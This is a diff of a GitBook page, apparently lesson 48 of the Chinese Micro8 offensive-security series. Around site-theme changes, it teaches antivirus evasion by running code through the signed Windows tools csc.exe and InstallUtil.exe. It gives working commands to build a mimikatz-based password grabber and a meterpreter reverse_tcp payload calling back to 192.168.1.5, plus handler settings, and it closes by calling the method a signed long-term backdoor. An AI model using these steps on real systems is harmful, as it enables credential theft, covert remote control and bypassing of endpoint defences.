@@ -1,14 +1,14 @@
 
 <!DOCTYPE HTML>
-<html lang="" >
+<html lang="zh-hans" >
     <head>
         <meta charset="UTF-8">
         <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
-        <title>第四十八课：payload分离免杀思路第二季 · GitBook</title>
+        <title>第四十八课：payload分离免杀思路第二季 · Micro8 系列教程</title>
         <meta http-equiv="X-UA-Compatible" content="IE=edge" />
         <meta name="description" content="">
         <meta name="generator" content="GitBook 3.2.3">
-        
+        <meta name="author" content="Micro8 系列作者">
         
         
     
@@ -17,17 +17,33 @@
     
             
                 
-                <link rel="stylesheet" href="../gitbook/gitbook-plugin-highlight/website.css">
+                <link rel="stylesheet" href="../gitbook/gitbook-plugin-search-plus/search.css">
                 
             
                 
-                <link rel="stylesheet" href="../gitbook/gitbook-plugin-search/search.css">
+                <link rel="stylesheet" href="../gitbook/gitbook-plugin-prism/prism-darcula.css">
+                
+            
+                
+                <link rel="stylesheet" href="../gitbook/gitbook-plugin-splitter/splitter.css">
+                
+            
+                
+                <link rel="stylesheet" href="../gitbook/gitbook-plugin-tbfed-pagefooter/footer.css">
+                
+            
+                
+                <link rel="stylesheet" href="../gitbook/gitbook-plugin-donate/plugin.css">
                 
             
                 
                 <link rel="stylesheet" href="../gitbook/gitbook-plugin-fontsettings/website.css">
                 
             
+                
+                <link rel="stylesheet" href="../gitbook/gitbook-plugin-theme-comscore/test.css">
+                
+            
         
 
     
@@ -47,6 +63,7 @@
     
 
         
+    
     
     
     <meta name="HandheldFriendly" content="true"/>
@@ -63,6 +80,17 @@
     <link rel="prev" href="47_payload分离免杀思路.html" />
     
 
+    <style>
+    @media only screen and (max-width: 640px) {
+        .book-header .hidden-mobile {
+            display: none;
+        }
+    }
+    </style>
+    <script>
+        window["gitbook-plugin-github-buttons"] = {"repo":"https://github.com/Micropoor/Micro8","types":["star","watch","fork"],"size":"small"};
+    </script>
+
     </head>
     <body>
         
@@ -71,7 +99,7 @@
         
             
 <div id="book-search-input" role="search">
-    <input type="text" placeholder="Type to search" />
+    <input type="text" placeholder="输入并搜索" />
 </div>
 
             
@@ -82,7 +110,21 @@
 <ul class="summary">
     
     
+    
+        
+        <li>
+            <a href="https://micropoor.blogspot.com" target="_blank" class="custom-link">Micropoor</a>
+        </li>
+    
+        
+        <li>
+            <a href="https://github.com/micro8" target="_blank" class="custom-link">Github Micro8</a>
+        </li>
+    
+    
 
+    
+    <li class="divider"></li>
     
 
     
@@ -1785,7 +1827,7 @@
 
     <li>
         <a href="https://www.gitbook.com" target="blank" class="gitbook-link">
-            Published with GitBook
+            本书使用 GitBook 发布
         </a>
     </li>
 </ul>
@@ -1818,7 +1860,7 @@
                     <div class="page-wrapper" tabindex="-1" role="main">
                         <div class="page-inner">
                             
-<div id="book-search-results">
+<div class="search-plus" id="book-search-results">
     <div class="search-noresults">
     
                                 <section class="normal markdown-section">
@@ -1828,15 +1870,15 @@
 <p>Windows &#x81EA; Windows XP Media Center Edition &#x5F00;&#x59CB;&#x9ED8;&#x8BA4;&#x5B89;&#x88C5; NET Framework&#xFF0C;&#x76F4;&#x81F3;&#x76EE;&#x524D;&#x7684; Windows 10&#xFF0C;&#x6700;&#x65B0;&#x7684;&#x9ED8;&#x8BA4;&#x7248;&#x672C;&#x4E3A;4.6.00081.00&#x3002;&#x968F;&#x7740;&#x88C5;&#x673A;&#x91CF;&#xFF0C;&#x6700;&#x65B0;&#x9ED8;&#x8BA4;&#x5B89;&#x88C5;&#x7248;&#x672C;&#x4E3A;4.7.2053.0&#x3002;</p>
 <h3 id="cscexe&#xFF1A;">csc.exe&#xFF1A;</h3>
 <p>C# &#x7684;&#x5728; Windows &#x5E73;&#x53F0;&#x4E0B;&#x7684;&#x7F16;&#x8BD1;&#x5668;&#x540D;&#x79F0;&#x662F; Csc.exe&#xFF0C;&#x5982;&#x679C;&#x4F60;&#x7684; .NET FrameWork SDK &#x5B89;&#x88C5;&#x5728; C &#x76D8;&#xFF0C;&#x90A3;&#x4E48;&#x4F60;&#x53EF;&#x4EE5;&#x5728; <code>C:\WINNT\Microsoft.NET\Framework\xxxxx</code> &#x76EE;&#x5F55;&#x4E2D;&#x53D1;&#x73B0;&#x5B83;&#x3002;&#x4E3A;&#x4E86;&#x4F7F;&#x7528;&#x65B9;&#x4FBF;&#xFF0C;&#x4F60;&#x53EF;&#x4EE5;&#x624B;&#x52A8;&#x628A;&#x8FD9;&#x4E2A;&#x76EE;&#x5F55;&#x6DFB;&#x52A0;&#x5230; Path &#x73AF;&#x5883;&#x53D8;&#x91CF;&#x4E2D;&#x53BB;&#x3002;&#x7528; Csc.exe &#x7F16;&#x8BD1; HelloWorld.cs &#x975E;&#x5E38;&#x7B80;&#x5355;&#xFF0C;&#x6253;&#x5F00;&#x547D;&#x4EE4;&#x63D0;&#x793A;&#x7B26;&#xFF0C;&#x5E76;&#x5207;&#x6362;&#x5230;&#x5B58;&#x653E; test.cs &#x6587;&#x4EF6;&#x7684;&#x76EE;&#x5F55;&#x4E2D;&#xFF0C;&#x8F93;&#x5165;&#x4E0B;&#x5217;&#x884C;&#x547D;&#x4EE4;: <code>csc /target:exe test.cs</code>&#x5C06; Ttest.cs &#x7F16;&#x8BD1;&#x6210;&#x540D;&#x4E3A; test.exe &#x7684; console &#x5E94;&#x7528;&#x7A0B;&#x5E8F;</p>
-<pre><code class="lang-bash">//test.cs
+<pre class="language-"><code class="lang-bash">//test.cs
 using System&#x37E; 
 class TestApp 
-{
-    public static void <span class="hljs-function"><span class="hljs-title">Main</span></span>()
-    {
-    Console.WriteLine(<span class="hljs-string">&quot;Micropoor!&quot;</span>)&#x37E;
-    }
-}
+<span class="token punctuation">{</span>
+    public static void Main<span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token punctuation">{</span>
+    Console.WriteLine<span class="token punctuation">(</span><span class="token string">&quot;Micropoor!&quot;</span><span class="token punctuation">)</span>&#x37E;
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
 </code></pre>
 <h3 id="installutilexe&#xFF1A;">InstallUtil.exe&#xFF1A;</h3>
 <p>&#x5FAE;&#x8F6F;&#x5B98;&#x65B9;&#x4ECB;&#x7ECD;&#x5982;&#x4E0B;&#xFF1A;</p>
@@ -1846,7 +1888,7 @@ This tool is automatically installed with Visual Studio. To run the tool,use the
 <a href="https://docs.microsoft.com/en-us/dotnet/framework/tools/installutil-exe-installer-tool" target="_blank">https://docs.microsoft.com/en-us/dotnet/framework/tools/installutil-exe-installer-tool</a></p>
 </blockquote>
 <p>&#x5173;&#x4E8E;&#x4E24;&#x4E2A;&#x6587;&#x4EF6;&#x9ED8;&#x8BA4;&#x5B89;&#x88C5;&#x4F4D;&#x7F6E;&#xFF1A;&#xFF08;&#x6CE8;&#x610F;x32&#xFF0C;x64&#x533A;&#x522B;&#xFF09;</p>
-<pre><code class="lang-bash">C:\Windows\Microsoft.NET\Framework\
+<pre class="language-"><code class="lang-bash">C:\Windows\Microsoft.NET\Framework\
 C:\Windows\Microsoft.NET\Framework64\
 C:\Windows\Microsoft.NET\Framework\
 C:\Windows\Microsoft.NET\Framework64\
@@ -1855,40 +1897,40 @@ C:\Windows\Microsoft.NET\Framework64\
 <h3 id="demo1&#xFF1A;">demo1&#xFF1A;</h3>
 <p>&#x4EE5;&#x6293;&#x5BC6;&#x7801;&#x4E3A;&#x4F8B;&#xFF1A;&#x6D4B;&#x8BD5;&#x73AF;&#x5883;&#xFF1A;&#x76EE;&#x6807;A&#x673A;&#x5B89;&#x88C5;&#x4E86; 360 &#x5957;&#x88C5;&#x3002;&#x76EE;&#x6807;&#x673A; B &#x5B89;&#x88C5;&#x4E86;&#x5C0F;&#x7EA2;&#x4F1E;&#xFF0C;NOD32&#x3002;&#x76EE;&#x6807;&#x673A;&#x5B89; C &#x88C5;&#x4E86;&#x9EA6;&#x5496;&#x5561;&#x3002;<br>&#x751F;&#x6210;&#x79D8;&#x94A5;&#xFF1A;<br><img src="media/cf8406093e5dbf031342ac48beecbb20.jpg" alt=""></p>
 <p>&#x6267;&#x884C;&#xFF1A;</p>
-<pre><code class="lang-bash">C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /r:System.EnterpriseServices.dll /r:System.IO.Compression.dll /target:library /out:Micropoor.exe /keyfile:C:\Users\Johnn\Desktop\installutil.snk /unsafe
+<pre class="language-"><code class="lang-bash">C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /r:System.EnterpriseServices.dll /r:System.IO.Compression.dll /target:library /out:Micropoor.exe /keyfile:C:\Users\Johnn\Desktop\installutil.snk /unsafe
 C:\Users\Johnn\Desktop\mimi.cs
 </code></pre>
 <p><img src="media/b24b55a30609a64e9ae6eedd59669600.jpg" alt=""></p>
-<pre><code class="lang-bash">C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=<span class="hljs-literal">false</span> /U C:\Users\Johnn\Desktop\Micropoor.exe
+<pre class="language-"><code class="lang-bash">C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile<span class="token operator">=</span> /LogToConsole<span class="token operator">=</span>false /U C:\Users\Johnn\Desktop\Micropoor.exe
 </code></pre>
 <p><img src="media/54e053d6ba6b7ddf3ecff38b2e4b554c.jpg" alt="">  </p>
 <p><img src="media/14d88766fa1337b2a7a1f4fcd0e41e7b.jpg" alt=""></p>
 <h3 id="demo2&#xFF1A;">demo2&#xFF1A;</h3>
 <p>&#x4EE5;msf&#x4E3A;&#x4F8B;&#xFF1A;<br>&#x751F;&#x6210;shllcode</p>
-<pre><code class="lang-bash">msfvenom --platform Windows <span class="hljs-_">-a</span> x64 -p windows/x64/meterpreter/reverse_tcp_uuid LHOST=192.168.1.5 LPORT=8080 -b <span class="hljs-string">&apos;\x00&apos;</span> <span class="hljs-_">-e</span> x64/xor -i 10 <span class="hljs-_">-f</span> csharp -o ./Micropoor.txt
+<pre class="language-"><code class="lang-bash">msfvenom --platform Windows -a x64 -p windows/x64/meterpreter/reverse_tcp_uuid LHOST<span class="token operator">=</span>192.168.1.5 LPORT<span class="token operator">=</span>8080 -b <span class="token string">&apos;\x00&apos;</span> -e x64/xor -i 10 -f csharp -o ./Micropoor.txt
 </code></pre>
 <p><img src="media/60dc9d8d0c0d3716c0111382fda0880f.jpg" alt="">  </p>
 <p><img src="media/06b4768ab7fb03e67d866bfa3535a8d0.jpg" alt=""></p>
 <p>&#x66FF;&#x6362;shellcode&#x3002;<br><img src="media/1981b698893f18b579b053c1c47cbbb5.jpg" alt=""></p>
 <p>&#x7F16;&#x8BD1;&#xFF1A;</p>
-<pre><code class="lang-bash">C:\Windows\Microsoft.NET\Framework64\v2.0.50727\csc.exe /unsafe /platform:x64 /out:Micropoor.exe M.cs
+<pre class="language-"><code class="lang-bash">C:\Windows\Microsoft.NET\Framework64\v2.0.50727\csc.exe /unsafe /platform:x64 /out:Micropoor.exe M.cs
 </code></pre>
 <p><img src="media/44a48a754a1077975cf9f7245474d6f4.jpg" alt=""></p>
 <p>&#x8FD0;&#x884C;&#xFF1A;</p>
-<pre><code class="lang-bash">C:\Windows\Microsoft.NET\Framework64\v2.0.50727\InstallUtil.exe /logfile= /LogToConsole=<span class="hljs-literal">false</span> /U Micropoor.exe
+<pre class="language-"><code class="lang-bash">C:\Windows\Microsoft.NET\Framework64\v2.0.50727\InstallUtil.exe /logfile<span class="token operator">=</span> /LogToConsole<span class="token operator">=</span>false /U Micropoor.exe
 </code></pre>
 <p><img src="media/2e2468278724012a07b672ba28994b41.jpg" alt=""></p>
 <p><strong>&#x6CE8;&#xFF1A;&#x5728;&#x5B9E;&#x9645;&#x6D4B;&#x8BD5;&#x7684;&#x8FC7;&#x7A0B;&#xFF0C;&#x8D77;&#x76D1;&#x542C;&#x9700;&#x8981;&#x914D;&#x7F6E;&#x4E00;&#x4E9B;&#x53C2;&#x6570;&#xFF0C;&#x9632;&#x6B62;&#x5047;&#x6B7B;&#x4E0E;&#x5047;session&#x3002;</strong>  </p>
-<pre><code class="lang-bash">msf exploit(multi/handler) &gt; <span class="hljs-built_in">set</span> exitonsession <span class="hljs-literal">false</span> 
-exitonsession =&gt; <span class="hljs-literal">false</span>
-msf exploit(multi/handler) &gt; <span class="hljs-built_in">set</span> EnableStageEncoding <span class="hljs-literal">true</span>
-EnableStageEncoding =&gt; <span class="hljs-literal">true</span>
-msf exploit(multi/handler) &gt;
-msf exploit(multi/handler) &gt; <span class="hljs-built_in">set</span> Stageencoder x64/xor 
-Stageencoder =&gt; x64/xor
-msf exploit(multi/handler) &gt; <span class="hljs-built_in">set</span> stageencodingfallback <span class="hljs-literal">false</span>
-stageencodingfallback =&gt; <span class="hljs-literal">false</span>
-msf exploit(multi/handler) &gt; exploit -j -z
+<pre class="language-"><code class="lang-bash">msf exploit<span class="token punctuation">(</span>multi/handler<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token keyword">set</span> exitonsession <span class="token boolean">false</span> 
+exitonsession <span class="token operator">=</span><span class="token operator">&gt;</span> <span class="token boolean">false</span>
+msf exploit<span class="token punctuation">(</span>multi/handler<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token keyword">set</span> EnableStageEncoding <span class="token boolean">true</span>
+EnableStageEncoding <span class="token operator">=</span><span class="token operator">&gt;</span> <span class="token boolean">true</span>
+msf exploit<span class="token punctuation">(</span>multi/handler<span class="token punctuation">)</span> <span class="token operator">&gt;</span>
+msf exploit<span class="token punctuation">(</span>multi/handler<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token keyword">set</span> Stageencoder x64/xor 
+Stageencoder <span class="token operator">=</span><span class="token operator">&gt;</span> x64/xor
+msf exploit<span class="token punctuation">(</span>multi/handler<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token keyword">set</span> stageencodingfallback <span class="token boolean">false</span>
+stageencodingfallback <span class="token operator">=</span><span class="token operator">&gt;</span> <span class="token boolean">false</span>
+msf exploit<span class="token punctuation">(</span>multi/handler<span class="token punctuation">)</span> <span class="token operator">&gt;</span> exploit -j -z
 </code></pre>
 <p><img src="media/e0546970d950f42b600bc2c6822981e2.jpg" alt=""></p>
 <p>&#x4E0A;&#x7EBF;&#xFF1A;<br><img src="media/c77a11ea1cd8acacd645ffd057050d18.jpg" alt=""></p>
@@ -1898,7 +1940,9 @@ shllcode.cs</p>
 <p>  &#x540E;&#x8005;&#x7684;&#x8BDD;&#xFF1A;&#x8BE5;&#x65B9;&#x6CD5;&#x53EF;&#x4EE5;&#x505A;&#x4E00;&#x4E2A;&#x5E26;&#x7B7E;&#x540D;&#x7684;&#x957F;&#x671F;&#x540E;&#x95E8;&#x3002;</p>
 <p>  Micropoor</p>
 </blockquote>
-
+<footer class="page-footer"><span class="copyright">Copyright &#xA9; Micro8 2018 all right reserved&#xFF0C;powered by Gitbook</span><span class="footer-modification">&#x4FEE;&#x8BA2;&#x65F6;&#x95F4;&#xFF1A;
+2019-02-23 18:05
+</span></footer>
                                 
                                 </section>
                             
@@ -1941,7 +1985,7 @@ shllcode.cs</p>
     <script>
         var gitbook = gitbook || [];
         gitbook.push(function() {
-            gitbook.page.hasChanged({"page":{"title":"第四十八课：payload分离免杀思路第二季","level":"1.4.48","depth":2,"next":{"title":"第四十九课：关于Powershell对抗安全软件","level":"1.4.49","depth":2,"path":"Chapter1/49_关于Powershell对抗安全软件.md","ref":"Chapter1/49_关于Powershell对抗安全软件.md","articles":[]},"previous":{"title":"第四十七课：payload分离免杀思路","level":"1.4.47","depth":2,"path":"Chapter1/47_payload分离免杀思路.md","ref":"Chapter1/47_payload分离免杀思路.md","articles":[]},"dir":"ltr"},"config":{"gitbook":"*","theme":"default","variables":{},"plugins":[],"pluginsConfig":{"highlight":{},"search":{},"lunr":{"maxIndexSize":1000000,"ignoreSpecialCharacters":false},"sharing":{"facebook":true,"twitter":true,"google":false,"weibo":false,"instapaper":false,"vk":false,"all":["facebook","google","twitter","weibo","instapaper"]},"fontsettings":{"theme":"white","family":"sans","size":2},"theme-default":{"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"showLevel":false}},"structure":{"langs":"LANGS.md","readme":"README.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"pdf":{"pageNumbers":true,"fontSize":12,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56}},"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"}},"file":{"path":"Chapter1/48_payload分离免杀思路第二季.md","mtime":"2019-02-23T10:05:33.860Z","type":"markdown"},"gitbook":{"version":"3.2.3","time":"2019-02-25T04:00:06.266Z"},"basePath":"..","book":{"language":""}});
+            gitbook.page.hasChanged({"page":{"title":"第四十八课：payload分离免杀思路第二季","level":"1.4.48","depth":2,"next":{"title":"第四十九课：关于Powershell对抗安全软件","level":"1.4.49","depth":2,"path":"Chapter1/49_关于Powershell对抗安全软件.md","ref":"Chapter1/49_关于Powershell对抗安全软件.md","articles":[]},"previous":{"title":"第四十七课：payload分离免杀思路","level":"1.4.47","depth":2,"path":"Chapter1/47_payload分离免杀思路.md","ref":"Chapter1/47_payload分离免杀思路.md","articles":[]},"dir":"ltr"},"config":{"plugins":["-lunr","-search","search-plus","-highlight","prism","theme-comscore","splitter","-sharing","sharing-plus","-expandable-chapters-small","simple-page-toc","github","github-buttons","tbfed-pagefooter","donate","ga"],"root":".","styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"pluginsConfig":{"tbfed-pagefooter":{"copyright":"Copyright © Micro8 2018","modify_label":"修订时间：","modify_format":"YYYY-MM-DD HH:mm"},"prism":{"css":["prism-themes/themes/prism-darcula.css"]},"github":{"url":"https://github.com/micro8"},"simple-page-toc":{"maxDepth":3,"skipFirstH1":true},"splitter":{},"sharing-plus":{"qq":false,"all":["facebook","google","twitter","instapaper","linkedin","pocket","stumbleupon"],"douban":false,"facebook":true,"weibo":false,"instapaper":false,"whatsapp":false,"hatenaBookmark":false,"twitter":true,"messenger":false,"line":false,"vk":false,"pocket":true,"google":false,"viber":false,"stumbleupon":false,"qzone":false,"linkedin":false},"donate":{"alipay":"","alipayText":"支付宝打赏","button":"赞赏码","title":"有读者问赞赏码，如下，自愿：","wechat":"./dashang.png","wechatText":""},"fontsettings":{"theme":"white","family":"sans","size":2},"theme-comscore":{},"github-buttons":{"repo":"https://github.com/Micropoor/Micro8","types":["star","watch","fork"],"size":"small"},"ga":{"configuration":"auto","token":"UA-135003278-1"},"sharing":{"qq":false,"all":["facebook","google","twitter","weibo","instapaper","linkedin","pocket","stumbleupon"],"douban":false,"facebook":false,"weibo":false,"instapaper":false,"whatsapp":false,"hatenaBookmark":false,"twitter":false,"messenger":false,"line":false,"vk":false,"pocket":false,"google":false,"viber":false,"stumbleupon":false,"qzone":false,"linkedin":false},"theme-default":{"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"showLevel":false},"search-plus":{}},"theme":"default","author":"Micro8 系列作者","pdf":{"pageNumbers":true,"fontSize":12,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56}},"structure":{"langs":"LANGS.md","readme":"README.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"variables":{},"title":"Micro8 系列教程","language":"zh-hans","links":{"sidebar":{"Micropoor":"https://micropoor.blogspot.com","Github Micro8":"https://github.com/micro8"}},"gitbook":"*","description":"Micro8"},"file":{"path":"Chapter1/48_payload分离免杀思路第二季.md","mtime":"2019-02-23T10:05:33.860Z","type":"markdown"},"gitbook":{"version":"3.2.3","time":"2019-02-25T13:55:17.972Z"},"basePath":"..","book":{"language":""}});
         });
     </script>
 </div>
@@ -1951,27 +1995,43 @@ shllcode.cs</p>
     <script src="../gitbook/theme.js"></script>
     
         
-        <script src="../gitbook/gitbook-plugin-search/search-engine.js"></script>
+        <script src="../gitbook/gitbook-plugin-search-plus/jquery.mark.min.js"></script>
         
     
         
-        <script src="../gitbook/gitbook-plugin-search/search.js"></script>
+        <script src="../gitbook/gitbook-plugin-search-plus/search.js"></script>
         
     
         
-        <script src="../gitbook/gitbook-plugin-lunr/lunr.min.js"></script>
+        <script src="../gitbook/gitbook-plugin-splitter/splitter.js"></script>
         
     
         
-        <script src="../gitbook/gitbook-plugin-lunr/search-lunr.js"></script>
+        <script src="../gitbook/gitbook-plugin-sharing-plus/buttons.js"></script>
         
     
         
-        <script src="../gitbook/gitbook-plugin-sharing/buttons.js"></script>
+        <script src="../gitbook/gitbook-plugin-github/plugin.js"></script>
+        
+    
+        
+        <script src="../gitbook/gitbook-plugin-github-buttons/plugin.js"></script>
+        
+    
+        
+        <script src="../gitbook/gitbook-plugin-donate/plugin.js"></script>
+        
+    
+        
+        <script src="../gitbook/gitbook-plugin-ga/plugin.js"></script>
         
     
         
         <script src="../gitbook/gitbook-plugin-fontsettings/fontsettings.js"></script>
+        
+    
+        
+        <script src="../gitbook/gitbook-plugin-theme-comscore/test.js"></script>
         
     
 
